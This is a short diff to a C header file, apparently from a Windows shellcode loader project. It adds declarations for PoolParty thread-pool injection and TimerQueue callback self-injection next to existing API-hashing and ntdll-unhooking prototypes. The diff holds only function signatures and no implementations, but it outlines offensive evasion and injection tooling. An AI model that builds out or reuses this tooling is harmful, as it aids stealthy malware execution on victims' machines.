@@ -21,5 +21,12 @@ FARPROC GetProcAddressH(HMODULE moduleHandle, DWORD hash);
 BOOL Unhook(LPVOID module);
 LPVOID MapNtdll();
 
+// PoolParty thread-pool injection (poolparty.c)
+BOOL PoolPartyTpDirect   (IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, IN LPCSTR szTarget);
+BOOL PoolPartyWfOverwrite(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, IN LPCSTR szTarget);
+
+// TimerQueue callback self-injection (timerqueue.c)
+BOOL TimerQueueInject(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode);
+
 typedef BOOL (WINAPI* cCPA)(LPCSTR lpApplicationName,LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags, LPVOID lpEnvironment,LPCSTR lpCurrentDirectory,LPSTARTUPINFOA lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);
 typedef BOOL (WINAPI* cDAPS)(DWORD dwProcessId);
